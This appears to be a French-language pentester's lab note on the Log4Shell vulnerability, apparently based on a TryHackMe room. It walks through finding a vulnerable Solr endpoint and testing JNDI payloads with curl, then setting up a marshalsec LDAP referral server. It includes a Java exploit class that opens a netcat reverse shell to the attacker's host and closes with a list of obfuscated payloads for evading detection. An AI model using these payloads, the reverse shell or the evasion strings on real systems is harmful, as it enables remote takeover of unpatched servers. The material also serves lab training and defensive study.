
---


---

Introduction :

La vulnérabilité à été trouvé le 9 décembre 2021, dans le package log4j dans java et permettait de faire du RCE. L'attaque qui en à découlé : "Log4Shell"

Systèmes qui ont été affectés : 
- https://github.com/YfryTchsGD/Log4jAttackSurface

Articles/ Infos : 
- https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java
- https://www.youtube.com/watch?v=7qoPDq41xhQ


- THM : https://tryhackme.com/r/room/solar
---
## Reconnaissance 

- Possibilité de trouvé avec nmap / Log4j lié à Apache.

1. Trouver dans un premier temps si il y a un Apache ainsi que sa version pour trouver un Log4J


---

## Poc

- Find an endpoint that is vulnérable to Log4J 
	- The "params" in the request is our entry point to prove that Log4J is exploitable


Syntaxe of Entry that can be Executed
- `${sys:os.name}`
- `${sys:user.name}`
- `${log4j:configParentLocation}`
- `${ENV:PATH}`
- `${ENV:HOSTNAME}`
- `${java:version}`


Genreal Payload : 
- `${jndi:ldap://ATTACKERCONTROLLEDHOST}`

LOG4J will invoke "Java Naming And Directory Interface" and allow us to access exterrnal resources.

[LDAP Manipulation](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)


Exemple : 

	- On a trouvé l'end point : /solr/admin/cores comme étant vulnérable 
	- On récupère l'ip de notre machine attaquante 
	- On injecte notre payload de test.

Ip Attaquant : 

```
>>> ip -br -c a
```


![[ip_attaquant.png]]

On va donc essayer notre payload 

> On ecoute sur le port 9999 sur notre machine 


```
>>> nc -lnvp 9999
```

On effectue un curl donc avec notre payload 

```
>>> curl 'http://10.10.205.240:8983/solr/admin/cores?foo=$\{jndi:ldap://10.10.140.75:9999\}'

```


![[test_exploit.png]]

La vulnérabilité est bien présente

---
## Exploitation 

- Pour exploiter le Log4j on va utiliser un "LDAP Referral Server" pour rediriger la requetes vers du code malvaillant qui sera executé sur la machine de la victime.

> Utilisation de [marshalsec](https://github.com/mbechler/marshalsec)

Installation de marshalsec et ensuite build avec la commande : 

```shell-session
>>> mvn clean package -DskipTests
```


On va creer notre payload : 

```
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"
```

Réponse de la console 

```
>>> Listening on 0.0.0.0:1389
```

On créer un fichier .java qui va contenir notre payload :

```java
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```


On compile : 

``` python
>>> javac Exploit.java -source 8 -target 8
```

On lance le serveur Python : 

On relance le listener nc 

```python
>>> nc -lvnp 9999
```

On fais notre requete

```python
>>> curl 'http://10.10.188.50:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\}'
```

On execute et hop on a acces au shell 


---
## Other Ressources 

- https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes
- https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d
- https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228
- https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1
- https://github.com/darkarnium/CVE-2021-44228

Massive Ressources : https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/ 

--- 
## To ByPass Detection 

```
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}

${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}

${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}

${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}

${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}

${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}

${${::-j}ndi:rmi://attackerendpoint.com/}
```

- https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/
